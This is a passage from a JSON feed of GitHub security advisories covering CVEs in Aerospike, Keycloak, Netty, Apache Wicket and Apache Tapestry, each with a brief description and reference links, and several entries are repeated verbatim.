href=\"https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a\">https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae\">https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36\">https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jj95-55cr-9597\">https://github.com/advisories/GHSA-jj95-55cr-9597</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jj95-55cr-9597",
            "title": "[com.aerospike:aerospike-client] Aerospike Java Client vulnerable to unsafe deserialization of server responses",
            "date_modified": "2023-08-08T14:55:46.000Z",
            "date_published": "2023-08-03T19:45:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jj95-55cr-9597"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>org.keycloak.services.resources.SocialResource.callback</code> method in JBoss KeyCloak before 1.0.3.Final allows remote attackers to conduct cross-site request forgery (CSRF) attacks by leveraging lack of CSRF protection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-3709\">https://nvd.nist.gov/vuln/detail/CVE-2014-3709</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1154971\">https://bugzilla.redhat.com/show_bug.cgi?id=1154971</a></li>\n<li><a href=\"https://issues.jboss.org/browse/KEYCLOAK-765\">https://issues.jboss.org/browse/KEYCLOAK-765</a></li>\n<li><a href=\"https://github.com/keycloak/keycloak/commit/bb132e1aa0b3b3a123883d0b8d0b788337df956d\">https://github.com/keycloak/keycloak/commit/bb132e1aa0b3b3a123883d0b8d0b788337df956d</a></li>\n<li><a href=\"https://web.archive.org/web/20200227141715/http://www.securityfocus.com/bid/101508\">https://web.archive.org/web/20200227141715/http://www.securityfocus.com/bid/101508</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xr6q-qqx7-553g\">https://github.com/advisories/GHSA-xr6q-qqx7-553g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xr6q-qqx7-553g",
            "title": "[org.keycloak:keycloak-services] JBoss Keycloak CSRF Vulnerability",
            "date_modified": "2023-08-07T20:35:13.000Z",
            "date_published": "2022-05-17T00:26:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xr6q-qqx7-553g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>JBoss KeyCloak: Open redirect vulnerability via failure to validate the redirect URL.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-3652\">https://nvd.nist.gov/vuln/detail/CVE-2014-3652</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/cve-2014-3652\">https://access.redhat.com/security/cve/cve-2014-3652</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2014-3652\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2014-3652</a></li>\n<li><a href=\"https://github.com/keycloak/keycloak/commit/6b2a4229e3b869eec9d4adc30c1afdf71e78cbdf\">https://github.com/keycloak/keycloak/commit/6b2a4229e3b869eec9d4adc30c1afdf71e78cbdf</a></li>\n<li><a href=\"https://issues.jboss.org/browse/KEYCLOAK-700\">https://issues.jboss.org/browse/KEYCLOAK-700</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5r7w-pjx8-99qg\">https://github.com/advisories/GHSA-5r7w-pjx8-99qg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5r7w-pjx8-99qg",
            "title": "[org.keycloak:keycloak-services] JBoss KeyCloak Open Redirect",
            "date_modified": "2023-08-07T20:32:27.000Z",
            "date_published": "2022-05-17T19:57:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5r7w-pjx8-99qg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>If a JBoss Keycloak application was configured to use <code>*</code> as a permitted web origin in the Keycloak administrative console, crafted requests to the <code>login-status-iframe.html</code> endpoint could inject arbitrary Javascript into the generated HTML code via the \"origin\" query parameter, leading to a cross-site scripting (XSS) vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-3656\">https://nvd.nist.gov/vuln/detail/CVE-2014-3656</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/cve-2014-3656\">https://access.redhat.com/security/cve/cve-2014-3656</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2014-3656\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2014-3656</a></li>\n<li><a href=\"https://github.com/keycloak/keycloak/commit/63b41e2548cbc20bd3758e34a82d880e177bf24c\">https://github.com/keycloak/keycloak/commit/63b41e2548cbc20bd3758e34a82d880e177bf24c</a></li>\n<li><a href=\"https://issues.jboss.org/browse/KEYCLOAK-703\">https://issues.jboss.org/browse/KEYCLOAK-703</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JAVA-ORGKEYCLOAK-31231\">https://security.snyk.io/vuln/SNYK-JAVA-ORGKEYCLOAK-31231</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-px42-mr8m-cpgh\">https://github.com/advisories/GHSA-px42-mr8m-cpgh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-px42-mr8m-cpgh",
            "title": "[org.keycloak:keycloak-core] JBoss KeyCloak Cross-site Scripting Vulnerability",
            "date_modified": "2023-08-07T20:27:42.000Z",
            "date_published": "2022-05-17T19:57:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-px42-mr8m-cpgh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>WebSocket08FrameDecoder</code> in Netty 3.6.x before 3.6.9, 3.7.x before 3.7.1, 3.8.x before 3.8.2, 3.9.x before 3.9.1, and 4.0.x before 4.0.19 allows remote attackers to cause a denial of service (memory consumption) via a <code>TextWebSocketFrame</code> followed by a long stream of <code>ContinuationWebSocketFrames</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-0193\">https://nvd.nist.gov/vuln/detail/CVE-2014-0193</a></li>\n<li><a href=\"https://github.com/netty/netty/issues/2441\">https://github.com/netty/netty/issues/2441</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E\">https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2020/02/msg00018.html\">https://lists.debian.org/debian-lts-announce/2020/02/msg00018.html</a></li>\n<li><a href=\"http://netty.io/news/2014/04/30/release-day.html\">http://netty.io/news/2014/04/30/release-day.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1019.html\">http://rhn.redhat.com/errata/RHSA-2014-1019.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1020.html\">http://rhn.redhat.com/errata/RHSA-2014-1020.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1021.html\">http://rhn.redhat.com/errata/RHSA-2014-1021.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1351.html\">http://rhn.redhat.com/errata/RHSA-2014-1351.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0675.html\">http://rhn.redhat.com/errata/RHSA-2015-0675.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0720.html\">http://rhn.redhat.com/errata/RHSA-2015-0720.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0765.html\">http://rhn.redhat.com/errata/RHSA-2015-0765.html</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E\">https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E</a></li>\n<li><a href=\"https://web.archive.org/web/20140509033427/http://www.securityfocus.com/bid/67182\">https://web.archive.org/web/20140509033427/http://www.securityfocus.com/bid/67182</a></li>\n<li><a href=\"https://web.archive.org/web/20140509044857/http://secunia.com/advisories/58280\">https://web.archive.org/web/20140509044857/http://secunia.com/advisories/58280</a></li>\n<li><a href=\"https://web.archive.org/web/20161119201425/http://secunia.com/advisories/59290\">https://web.archive.org/web/20161119201425/http://secunia.com/advisories/59290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7vpq-g998-qpv7\">https://github.com/advisories/GHSA-7vpq-g998-qpv7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7vpq-g998-qpv7",
            "title": "[io.netty:netty] Netty denial of service vulnerability",
            "date_modified": "2023-08-07T20:25:37.000Z",
            "date_published": "2022-05-13T01:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7vpq-g998-qpv7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>WebSocket08FrameDecoder</code> in Netty 3.6.x before 3.6.9, 3.7.x before 3.7.1, 3.8.x before 3.8.2, 3.9.x before 3.9.1, and 4.0.x before 4.0.19 allows remote attackers to cause a denial of service (memory consumption) via a <code>TextWebSocketFrame</code> followed by a long stream of <code>ContinuationWebSocketFrames</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-0193\">https://nvd.nist.gov/vuln/detail/CVE-2014-0193</a></li>\n<li><a href=\"https://github.com/netty/netty/issues/2441\">https://github.com/netty/netty/issues/2441</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E\">https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2020/02/msg00018.html\">https://lists.debian.org/debian-lts-announce/2020/02/msg00018.html</a></li>\n<li><a href=\"http://netty.io/news/2014/04/30/release-day.html\">http://netty.io/news/2014/04/30/release-day.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1019.html\">http://rhn.redhat.com/errata/RHSA-2014-1019.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1020.html\">http://rhn.redhat.com/errata/RHSA-2014-1020.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1021.html\">http://rhn.redhat.com/errata/RHSA-2014-1021.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1351.html\">http://rhn.redhat.com/errata/RHSA-2014-1351.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0675.html\">http://rhn.redhat.com/errata/RHSA-2015-0675.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0720.html\">http://rhn.redhat.com/errata/RHSA-2015-0720.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0765.html\">http://rhn.redhat.com/errata/RHSA-2015-0765.html</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E\">https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E</a></li>\n<li><a href=\"https://web.archive.org/web/20140509033427/http://www.securityfocus.com/bid/67182\">https://web.archive.org/web/20140509033427/http://www.securityfocus.com/bid/67182</a></li>\n<li><a href=\"https://web.archive.org/web/20140509044857/http://secunia.com/advisories/58280\">https://web.archive.org/web/20140509044857/http://secunia.com/advisories/58280</a></li>\n<li><a href=\"https://web.archive.org/web/20161119201425/http://secunia.com/advisories/59290\">https://web.archive.org/web/20161119201425/http://secunia.com/advisories/59290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7vpq-g998-qpv7\">https://github.com/advisories/GHSA-7vpq-g998-qpv7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7vpq-g998-qpv7",
            "title": "[io.netty:netty] Netty denial of service vulnerability",
            "date_modified": "2023-08-07T20:25:37.000Z",
            "date_published": "2022-05-13T01:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7vpq-g998-qpv7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>WebSocket08FrameDecoder</code> in Netty 3.6.x before 3.6.9, 3.7.x before 3.7.1, 3.8.x before 3.8.2, 3.9.x before 3.9.1, and 4.0.x before 4.0.19 allows remote attackers to cause a denial of service (memory consumption) via a <code>TextWebSocketFrame</code> followed by a long stream of <code>ContinuationWebSocketFrames</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-0193\">https://nvd.nist.gov/vuln/detail/CVE-2014-0193</a></li>\n<li><a href=\"https://github.com/netty/netty/issues/2441\">https://github.com/netty/netty/issues/2441</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E\">https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2020/02/msg00018.html\">https://lists.debian.org/debian-lts-announce/2020/02/msg00018.html</a></li>\n<li><a href=\"http://netty.io/news/2014/04/30/release-day.html\">http://netty.io/news/2014/04/30/release-day.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1019.html\">http://rhn.redhat.com/errata/RHSA-2014-1019.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1020.html\">http://rhn.redhat.com/errata/RHSA-2014-1020.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1021.html\">http://rhn.redhat.com/errata/RHSA-2014-1021.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1351.html\">http://rhn.redhat.com/errata/RHSA-2014-1351.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0675.html\">http://rhn.redhat.com/errata/RHSA-2015-0675.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0720.html\">http://rhn.redhat.com/errata/RHSA-2015-0720.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0765.html\">http://rhn.redhat.com/errata/RHSA-2015-0765.html</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E\">https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E</a></li>\n<li><a href=\"https://web.archive.org/web/20140509033427/http://www.securityfocus.com/bid/67182\">https://web.archive.org/web/20140509033427/http://www.securityfocus.com/bid/67182</a></li>\n<li><a href=\"https://web.archive.org/web/20140509044857/http://secunia.com/advisories/58280\">https://web.archive.org/web/20140509044857/http://secunia.com/advisories/58280</a></li>\n<li><a href=\"https://web.archive.org/web/20161119201425/http://secunia.com/advisories/59290\">https://web.archive.org/web/20161119201425/http://secunia.com/advisories/59290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7vpq-g998-qpv7\">https://github.com/advisories/GHSA-7vpq-g998-qpv7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7vpq-g998-qpv7",
            "title": "[io.netty:netty] Netty denial of service vulnerability",
            "date_modified": "2023-08-07T20:25:37.000Z",
            "date_published": "2022-05-13T01:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7vpq-g998-qpv7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>WebSocket08FrameDecoder</code> in Netty 3.6.x before 3.6.9, 3.7.x before 3.7.1, 3.8.x before 3.8.2, 3.9.x before 3.9.1, and 4.0.x before 4.0.19 allows remote attackers to cause a denial of service (memory consumption) via a <code>TextWebSocketFrame</code> followed by a long stream of <code>ContinuationWebSocketFrames</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-0193\">https://nvd.nist.gov/vuln/detail/CVE-2014-0193</a></li>\n<li><a href=\"https://github.com/netty/netty/issues/2441\">https://github.com/netty/netty/issues/2441</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E\">https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2020/02/msg00018.html\">https://lists.debian.org/debian-lts-announce/2020/02/msg00018.html</a></li>\n<li><a href=\"http://netty.io/news/2014/04/30/release-day.html\">http://netty.io/news/2014/04/30/release-day.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1019.html\">http://rhn.redhat.com/errata/RHSA-2014-1019.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1020.html\">http://rhn.redhat.com/errata/RHSA-2014-1020.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1021.html\">http://rhn.redhat.com/errata/RHSA-2014-1021.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1351.html\">http://rhn.redhat.com/errata/RHSA-2014-1351.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0675.html\">http://rhn.redhat.com/errata/RHSA-2015-0675.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0720.html\">http://rhn.redhat.com/errata/RHSA-2015-0720.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0765.html\">http://rhn.redhat.com/errata/RHSA-2015-0765.html</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E\">https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E</a></li>\n<li><a href=\"https://web.archive.org/web/20140509033427/http://www.securityfocus.com/bid/67182\">https://web.archive.org/web/20140509033427/http://www.securityfocus.com/bid/67182</a></li>\n<li><a href=\"https://web.archive.org/web/20140509044857/http://secunia.com/advisories/58280\">https://web.archive.org/web/20140509044857/http://secunia.com/advisories/58280</a></li>\n<li><a href=\"https://web.archive.org/web/20161119201425/http://secunia.com/advisories/59290\">https://web.archive.org/web/20161119201425/http://secunia.com/advisories/59290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7vpq-g998-qpv7\">https://github.com/advisories/GHSA-7vpq-g998-qpv7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7vpq-g998-qpv7",
            "title": "[io.netty:netty] Netty denial of service vulnerability",
            "date_modified": "2023-08-07T20:25:37.000Z",
            "date_published": "2022-05-13T01:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7vpq-g998-qpv7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>WebSocket08FrameDecoder</code> in Netty 3.6.x before 3.6.9, 3.7.x before 3.7.1, 3.8.x before 3.8.2, 3.9.x before 3.9.1, and 4.0.x before 4.0.19 allows remote attackers to cause a denial of service (memory consumption) via a <code>TextWebSocketFrame</code> followed by a long stream of <code>ContinuationWebSocketFrames</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-0193\">https://nvd.nist.gov/vuln/detail/CVE-2014-0193</a></li>\n<li><a href=\"https://github.com/netty/netty/issues/2441\">https://github.com/netty/netty/issues/2441</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E\">https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2020/02/msg00018.html\">https://lists.debian.org/debian-lts-announce/2020/02/msg00018.html</a></li>\n<li><a href=\"http://netty.io/news/2014/04/30/release-day.html\">http://netty.io/news/2014/04/30/release-day.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1019.html\">http://rhn.redhat.com/errata/RHSA-2014-1019.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1020.html\">http://rhn.redhat.com/errata/RHSA-2014-1020.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1021.html\">http://rhn.redhat.com/errata/RHSA-2014-1021.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2014-1351.html\">http://rhn.redhat.com/errata/RHSA-2014-1351.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0675.html\">http://rhn.redhat.com/errata/RHSA-2015-0675.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0720.html\">http://rhn.redhat.com/errata/RHSA-2015-0720.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2015-0765.html\">http://rhn.redhat.com/errata/RHSA-2015-0765.html</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E\">https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E</a></li>\n<li><a href=\"https://web.archive.org/web/20140509033427/http://www.securityfocus.com/bid/67182\">https://web.archive.org/web/20140509033427/http://www.securityfocus.com/bid/67182</a></li>\n<li><a href=\"https://web.archive.org/web/20140509044857/http://secunia.com/advisories/58280\">https://web.archive.org/web/20140509044857/http://secunia.com/advisories/58280</a></li>\n<li><a href=\"https://web.archive.org/web/20161119201425/http://secunia.com/advisories/59290\">https://web.archive.org/web/20161119201425/http://secunia.com/advisories/59290</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7vpq-g998-qpv7\">https://github.com/advisories/GHSA-7vpq-g998-qpv7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7vpq-g998-qpv7",
            "title": "[io.netty:netty] Netty denial of service vulnerability",
            "date_modified": "2023-08-07T20:25:37.000Z",
            "date_published": "2022-05-13T01:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7vpq-g998-qpv7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Wicket before 1.5.12, 6.x before 6.17.0, and 7.x before 7.0.0-M3 might allow remote attackers to obtain sensitive information via vectors involving identifiers for storing page markup for temporary user sessions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-3526\">https://nvd.nist.gov/vuln/detail/CVE-2014-3526</a></li>\n<li><a href=\"https://wicket.apache.org/news/2014/09/22/cve-2014-3526.html\">https://wicket.apache.org/news/2014/09/22/cve-2014-3526.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q7wx-mhx4-jr8q\">https://github.com/advisories/GHSA-q7wx-mhx4-jr8q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q7wx-mhx4-jr8q",
            "title": "[org.apache.wicket:wicket-core] Apache Wicket Sensitive Data Exposure",
            "date_modified": "2023-08-07T20:24:21.000Z",
            "date_published": "2022-05-13T01:30:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q7wx-mhx4-jr8q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Wicket before 1.5.12, 6.x before 6.17.0, and 7.x before 7.0.0-M3 might allow remote attackers to obtain sensitive information via vectors involving identifiers for storing page markup for temporary user sessions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-3526\">https://nvd.nist.gov/vuln/detail/CVE-2014-3526</a></li>\n<li><a href=\"https://wicket.apache.org/news/2014/09/22/cve-2014-3526.html\">https://wicket.apache.org/news/2014/09/22/cve-2014-3526.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q7wx-mhx4-jr8q\">https://github.com/advisories/GHSA-q7wx-mhx4-jr8q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q7wx-mhx4-jr8q",
            "title": "[org.apache.wicket:wicket-core] Apache Wicket Sensitive Data Exposure",
            "date_modified": "2023-08-07T20:24:21.000Z",
            "date_published": "2022-05-13T01:30:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q7wx-mhx4-jr8q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Wicket before 1.5.12, 6.x before 6.17.0, and 7.x before 7.0.0-M3 might allow remote attackers to obtain sensitive information via vectors involving identifiers for storing page markup for temporary user sessions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-3526\">https://nvd.nist.gov/vuln/detail/CVE-2014-3526</a></li>\n<li><a href=\"https://wicket.apache.org/news/2014/09/22/cve-2014-3526.html\">https://wicket.apache.org/news/2014/09/22/cve-2014-3526.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q7wx-mhx4-jr8q\">https://github.com/advisories/GHSA-q7wx-mhx4-jr8q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q7wx-mhx4-jr8q",
            "title": "[org.apache.wicket:wicket-core] Apache Wicket Sensitive Data Exposure",
            "date_modified": "2023-08-07T20:24:21.000Z",
            "date_published": "2022-05-13T01:30:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q7wx-mhx4-jr8q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Tapestry before 5.3.6 relies on client-side object storage without checking whether a client has modified an object, which allows remote attackers to cause a denial of service (resource consumption) or execute arbitrary code via crafted serialized data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-1972\">https://nvd.nist.gov/vuln/detail/CVE-2014-1972</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/TAP5-2008\">https://issues.apache.org/jira/browse/TAP5-2008</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/84e99dedad2ecb4676de93c3ab73a8a10882951ab6984f514707f3d9@%3Cusers.tapestry.apache.org%3E\">https://lists.apache.org/thread.html/84e99dedad2ecb4676de93c3ab73a8a10882951ab6984f514707f3d9@%3Cusers.tapestry.apache.org%3E</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/bac8d6f9e1b4059b319d9cba6f33219a99b81623476ec896138f851c@%3Cusers.tapestry.apache.org%3E\">https://lists.apache.org/thread.html/bac8d6f9e1b4059b319d9cba6f33219a99b81623476ec896138f851c@%3Cusers.tapestry.apache.org%3E</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/r7d9c54beb1dc97dcccc58d9b5d31f0f7166f9a25ad1beba5f8091e0c@%3Ccommits.tapestry.apache.org%3E\">https://lists.apache.org/thread.html/r7d9c54beb1dc97dcccc58d9b5d31f0f7166f9a25ad1beba5f8091e0c@%3Ccommits.tapestry.apache.org%3E</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/r87523dd07886223aa086edc25fe9b8ddb9c1090f7db25b068dc30843@%3Ccommits.tapestry.apache.org%3E\">https://lists.apache.org/thread.html/r87523dd07886223aa086edc25fe9b8ddb9c1090f7db25b068dc30843@%3Ccommits.tapestry.apache.org%3E</a></li>\n<li><a href=\"https://tapestry.apache.org/release-notes-536.html\">https://tapestry.apache.org/release-notes-536.html</a></li>\n<li><a href=\"http://jvn.jp/en/jp/JVN17611367/index.html\">http://jvn.jp/en/jp/JVN17611367/index.html</a></li>\n<li><a href=\"http://jvndb.jvn.jp/jvndb/JVNDB-2015-000118\">http://jvndb.jvn.jp/jvndb/JVNDB-2015-000118</a></li>\n<li><a 